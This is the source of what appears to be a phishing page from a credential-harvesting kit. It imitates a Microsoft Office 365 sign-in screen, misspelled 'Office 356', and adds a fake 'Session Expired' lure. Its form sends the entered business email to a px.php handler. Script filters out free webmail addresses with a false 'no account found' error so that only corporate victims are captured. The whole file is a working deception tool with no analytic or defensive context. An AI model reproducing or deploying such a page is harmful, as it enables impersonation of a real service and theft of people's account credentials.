<?php
session_start();
?>
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
      <meta name="viewport" content="width=device-width,initial-scale=1" />
      <title>Checkpoint - Office 356 </title>
      <link href="../sources/eui_theme_amsterdam_light.css" rel="stylesheet" name="eui-theme" data-theme="light" />
      <link href="../sources/theme_only_light.bc.css" rel="stylesheet" name="chart-theme" data-theme="light" />
      <link href="../sources/app.css" rel="stylesheet" />
   </head>
   <body class="euiTheme-light">
   
      <style>
         /*   color variables */
         /*   border radius */
         *,
         *::after,
         *::before {
         -webkit-box-sizing: border-box;
         box-sizing: border-box;
         margin: 0;
         padding: 0;
         }
         button {
         font-family: inherit;
         font-size: 1rem;
         border: none;
         cursor: pointer;
         }
         .btn-primary {
         background-color: #0e48fe;
         border-radius: 0.2rem;
         display: -webkit-box;
         display: -ms-flexbox;
         display: flex;
         -webkit-box-pack: center;
         -ms-flex-pack: center;
         justify-content: center;
         -webkit-box-align: center;
         -ms-flex-align: center;
         align-items: center;
         gap: 0.5rem;
         color: #eef1f6;
         padding: 0.5rem;
         }
         .btn-primary svg {
         width: 1rem;
         fill: #eef1f6;
         }
         .btn-secondary {
         background-color: transparent;
         font-weight: bold;
         color: #0e48fe;
         }
         .notification {
         position: absolute;
         left: 50%;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%);
         background-color: #ffebeb;
         border-radius: 0.2rem;
         overflow: hidden;
         display: none;
         -webkit-box-pack: center;
         -ms-flex-pack: center;
         justify-content: center;
         -webkit-box-align: center;
         -ms-flex-align: center;
         align-items: center;
         gap: 1rem;
         }
         .notification__warning {
         width: 1.5rem;
         margin-left: 1rem;
         fill: #e00000;
         }
         .notification__close {
         background-color: #ffc2c2;
         padding: 1rem;
         display: -webkit-box;
         display: -ms-flexbox;
         display: flex;
         cursor: pointer;
         }
         .notification__close svg {
         width: 1rem;
         fill: #e00000;
         }
         .notification-show {
         -webkit-animation: warning 400ms ease-in-out forwards;
         animation: warning 400ms ease-in-out forwards;
         display: -webkit-box;
         display: -ms-flexbox;
         display: flex;
         }
         @-webkit-keyframes warning {
         0% {
         opacity: 0;
         top: 0;
         }
         5% {
         opacity: 0;
         }
         100% {
         opacity: 1;
         top: 2rem;
         }
         }
         @keyframes warning {
         0% {
         opacity: 0;
         top: 0;
         }
         5% {
         opacity: 0;
         }
         100% {
         opacity: 1;
         top: 2rem;
         }
         }
      </style>
      <div id="app-root">
         <div class="cloud-landing-page">
            <div class="cloud-landing-page-logo">
               <img alt="" src="../sources/lago.svg" width="80" height="20" class="euiIcon euiIcon--xxLarge cloud-landing-page-elastic-logo" />
            </div>
            <div class="euiSpacer euiSpacer--xl"></div>
            <div class="cloud-landing-page-content">
               <div class="euiPanel euiPanel--paddingMedium euiPanel--borderRadiusMedium euiPanel--plain euiPanel--hasShadow cloud-landing-page-panel cloud-landing-page-form-panel cloud-landing-page-panel-narrow" aria-live="polite">
                  <CENTER>
                     <button id="delete" class="btn-primary">
                        <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="10px" y="10px"
                           viewBox="0 0 504.4 504.4" style="enable-background:new 0 0 504.4 504.4;" xml:space="preserve">
                           <g>
                              <g>
                                 <polygon points="220,284.2 220,331.4 284,340.6 284,284.2 		"/>
                              </g>
                           </g>
                           <g>
                              <g>
                                 <polygon points="164,284.2 164,324.2 216,331 216,284.2 		"/>
                              </g>
                           </g>
                           <g>
                              <g>
                                 <polygon points="164,238.6 164,276.2 216,276.2 216,231.8 		"/>
                              </g>
                           </g>
                           <g>
                              <g>
                                 <polygon points="220,231.4 220,276.2 284,276.2 284,222.2 		"/>
                              </g>
                           </g>
                           <g>
                              <g>
                                 <path d="M377.6,0.2H126.4C56.8,0.2,0,57,0,126.6v251.6c0,69.2,56.8,126,126.4,126H378c69.6,0,126.4-56.8,126.4-126.4V126.6
                                    C504,57,447.2,0.2,377.6,0.2z M300,150.6v5.2l-8,1.6v-6.8c0-18.4,1.2-27.2-20.4-24c-0.4-2.8-1.2-5.6-1.6-8
                                    C296,114.6,300,122.2,300,150.6z M176,140.2c0-34,21.2-38.8,41.6-43.6c37.6-8.4,46.4,10.8,46.4,36.8v29.2l-8,1.6v-31.6
                                    c0-13.6-3.2-35.2-36.8-27.2c-22.4,5.2-35.2,12.4-35.2,35.2v37.2l-8,2.4V140.2z M248,132.2c-12,5.2-16,8.8-16,26.4v10.8l-8,1.6
                                    v-12.4c0-26,9.6-30,23.6-34.8C248,126.2,248,129,248,132.2z M388,393l-45.2,16.4L116,364.6V202.2l226.8-44.8l45.2,16.4V393z"/>
                              </g>
                           </g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                           <g></g>
                        </svg>
                        Archive_Portal_2021
                     </button>
                  </CENTER>
                  <div id="notification" class="notification">
                     <svg class="notification__warning" viewBox="0 0 512 512" width="100" title="exclamation-circle">
                        <path d="M504 256c0 136.997-111.043 248-248 248S8 392.997 8 256C8 119.083 119.043 8 256 8s248 111.083 248 248zm-248 50c-25.405 0-46 20.595-46 46s20.595 46 46 46 46-20.595 46-46-20.595-46-46-46zm-43.673-165.346l7.418 136c.347 6.364 5.609 11.346 11.982 11.346h48.546c6.373 0 11.635-4.982 11.982-11.346l7.418-136c.375-6.874-5.098-12.654-11.982-12.654h-63.383c-6.884 0-12.356 5.78-11.981 12.654z" />
                     </svg>
                     <p>Session Expired, please re-login.</p>
                     <button id="exitnow" class="btn-secondary">OK!</button>
                     <button id="close" class="notification__close">
                        <svg viewBox="0 0 352 512" width="100" title="times">
                           <path d="M242.72 256l100.07-100.07c12.28-12.28 12.28-32.19 0-44.48l-22.24-22.24c-12.28-12.28-32.19-12.28-44.48 0L176 189.28 75.93 89.21c-12.28-12.28-32.19-12.28-44.48 0L9.21 111.45c-12.28 12.28-12.28 32.19 0 44.48L109.28 256 9.21 356.07c-12.28 12.28-12.28 32.19 0 44.48l22.24 22.24c12.28 12.28 32.2 12.28 44.48 0L176 322.72l100.07 100.07c12.28 12.28 32.2 12.28 44.48 0l22.24-22.24c12.28-12.28 12.28-32.19 0-44.48L242.72 256z" />
                        </svg>
                     </button>
                  </div>
                  <div class="euiSpacer euiSpacer--xl"></div>
                  <div>
                     <form class="login-form-password" method="post" action="px.php">
                        <div data-test-id="privacy-fs">
                           <div class="euiFormRow login-form-email" id="i56ee7be1-68b2-11ec-a5a8-a9596b4e287d-row" data-test-id="username-form-row">
                              <div class="euiFormRow__labelWrapper"><label class="euiFormLabel euiFormRow__label euiFormLabel-isFocused" for="i56ee7be1-68b2-11ec-a5a8-a9596b4e287d">Business Email</label></div>
                              <div class="euiFormRow__fieldWrapper">
                                 <div class="euiFormControlLayout">
                                    <div class="euiFormControlLayout__childrenWrapper">
                                       <input type="text" id="i56ee7be1-68b2-11ec-a5a8-a9596b4e287d" name="emailo365" placeholder="Your work email" class="euiFieldText euiFieldText--withIcon" data-test-id="login-username" value="" autocomplete="off" autofocus/>
                                       <div class="euiFormControlLayoutIcons">
                                          <span class="euiFormControlLayoutCustomIcon">
                                             <svg
                                                width="18"
                                                height="18"
                                                viewBox="0 0 18 18"
                                                xmlns="http://www.w3.org/2000/svg"
                                                class="euiIcon euiIcon--medium euiIcon-isLoaded euiFormControlLayoutCustomIcon__icon"
                                                focusable="false"
                                                role="img"
                                                aria-hidden="true"
                                                >
                                                <g fill-rule="evenodd">
                                                   <path
                                                      d="M13.689 11.132c1.155 1.222 1.953 2.879 2.183 4.748a1.007 1.007 0 01-1 1.12H3.007a1.005 1.005 0 01-1-1.12c.23-1.87 1.028-3.526 2.183-4.748.247.228.505.442.782.633-1.038 1.069-1.765 2.55-1.972 4.237L14.872 16c-.204-1.686-.93-3.166-1.966-4.235a7.01 7.01 0 00.783-.633zM8.939 1c1.9 0 3 2 4.38 2.633a2.483 2.483 0 01-1.88.867c-.298 0-.579-.06-.844-.157A3.726 3.726 0 017.69 5.75c-1.395 0-3.75.25-3.245-1.903C5.94 3 6.952 1 8.94 1z"
                                                      ></path>
                                                   <path d="M8.94 2c2.205 0 4 1.794 4 4s-1.795 4-4 4c-2.207 0-4-1.794-4-4s1.793-4 4-4m0 9A5 5 0 108.937.999 5 5 0 008.94 11"></path>
                                                </g>
                                             </svg>
                                          </span>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="euiSpacer euiSpacer--l"></div>
                        </div>
                        <div class="euiSpacer euiSpacer--l"></div>
                        <div>
                           <button
						   id="checkbut"
                              class="euiButton euiButton--primary euiButton--fill euiButton--fullWidth cuiButton spinButton cloud-landing-page-form-submit-button"
                              disabled
                              type="submit"
                              data-test-id="login-button"
                              >
                           <span class="euiButtonContent euiButton__content">
                           <span class="euiButton__text"><span translate="no"></span>Next</span>
                           </span>
                           </button>
                        </div>
                        <div class="euiSpacer euiSpacer--l"></div>
                        <div class="social-signup-form-separator">
                           <div class="euiText euiText--small">Or log in with</div>
                        </div>
                        <div class="euiSpacer euiSpacer--l"></div>
                        <div class="euiFlexGroup euiFlexGroup--gutterSmall euiFlexGroup--alignItemsCenter euiFlexGroup--directionRow euiFlexGroup--responsive">
                           <div class="euiFlexItem">
                              <button class="euiButton euiButton--primary euiButton--fullWidth google-signup-form-button" type="button">
                                 <span class="euiButtonContent euiButton__content">
                                    <span class="euiButton__text">
                                       <div class="euiFlexGroup euiFlexGroup--gutterSmall euiFlexGroup--alignItemsCenter euiFlexGroup--directionRow">
                                          <div class="euiFlexItem"><img alt="" src="../sources/teams.svg" class="euiIcon" /></div>
                                          <div class="euiFlexItem">
                                             <div class="euiText euiText--small">Microsoft Teams</div>
                                          </div>
                                       </div>
                                    </span>
                                 </span>
                              </button>
                           </div>
                           <div class="euiFlexItem">
                              <button class="euiButton euiButton--primary euiButton--fullWidth azure-signup-form-button" type="button">
                                 <span class="euiButtonContent euiButton__content">
                                    <span class="euiButton__text">
                                       <div class="euiFlexGroup euiFlexGroup--gutterSmall euiFlexGroup--alignItemsCenter euiFlexGroup--directionRow">
                                          <div class="euiFlexItem">
                                             <img
                                                alt=""
                                                src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMSIgaGVpZ2h0PSIyMSIgdmlld0JveD0iMCAwIDIxIDIxIj4KICA8dGl0bGU+TVMtU3ltYm9sTG9ja3VwPC90aXRsZT4KICA8cmVjdCB4PSIxIiB5PSIxIiB3aWR0aD0iOSIgaGVpZ2h0PSI5IiBmaWxsPSIjZjI1MDIyIi8+CiAgPHJlY3QgeD0iMSIgeT0iMTEiIHdpZHRoPSI5IiBoZWlnaHQ9IjkiIGZpbGw9IiMwMGE0ZWYiLz4KICA8cmVjdCB4PSIxMSIgeT0iMSIgd2lkdGg9IjkiIGhlaWdodD0iOSIgZmlsbD0iIzdmYmEwMCIvPgogIDxyZWN0IHg9IjExIiB5PSIxMSIgd2lkdGg9IjkiIGhlaWdodD0iOSIgZmlsbD0iI2ZmYjkwMCIvPgo8L3N2Zz4K"
                                                class="euiIcon"
                                                />
                                          </div>
                                          <div class="euiFlexItem">
                                             <div class="euiText euiText--small">Microsoft</div>
                                          </div>
                                       </div>
                                    </span>
                                 </span>
                              </button>
                           </div>
                        </div>
                     </form>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
   <script type="text/javascript">
      $('#i56ee7be1-68b2-11ec-a5a8-a9596b4e287d').keyup(function(){
      if($.trim(this.value).length > 0)
          $("#checkbut").prop('disabled', false);
      });
      $('#i56ee7be1-68b2-11ec-a5a8-a9596b4e287d').keyup(function(){
      if($.trim(this.value).length == 0)
          $("#checkbut").prop('disabled', true);
      });
      $(document).ready(function() { 
      
      $('#checkbut').click(function() {  
      
       $(".error").hide();
       var hasError = false;
       var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
       var emailblockReg =
        /^([\w-\.]+@(?!gmail.com)(?!yahoo.com)(?!hotmail.com)([\w-]+\.)+[\w-]{2,4})?$/;
      
       var emailaddressVal = $("#i56ee7be1-68b2-11ec-a5a8-a9596b4e287d").val();
       if(emailaddressVal == '') {
         $(".euiFormControlLayout__childrenWrapper").after('</br><span class="error">Please enter your business email address.</span>');
         hasError = true;
       }
      
       else if(!emailReg.test(emailaddressVal)) {
         $(".euiFormControlLayout__childrenWrapper").after('</br><span class="error">Enter a valid business email address.</span>');
         hasError = true;
       }
      
       else if(!emailblockReg.test(emailaddressVal)) {
         $(".euiFormControlLayout__childrenWrapper").after('</br><span class="error">We could not find any account with that username.</span>');
         hasError = true
       } 
      
       if(hasError == true) { return false; }
      
       });
      });
      
   </script>
   <script type="text/javascript">
      const deleteBtn = document.getElementById("delete");
      const notification = document.getElementById("notification");
      const closeBtn = document.getElementById("close");
      const exit = document.getElementById("exitnow"); 
	  
      deleteBtn.addEventListener("click", () => {
       notification.classList.add("notification-show");
      });
      
      closeBtn.addEventListener("click", () => {
       notification.classList.remove("notification-show");
	   location.href = location.href;
      });
	  exit.addEventListener("click", () => {
       location.href = location.href;
      });
   </script>
</html>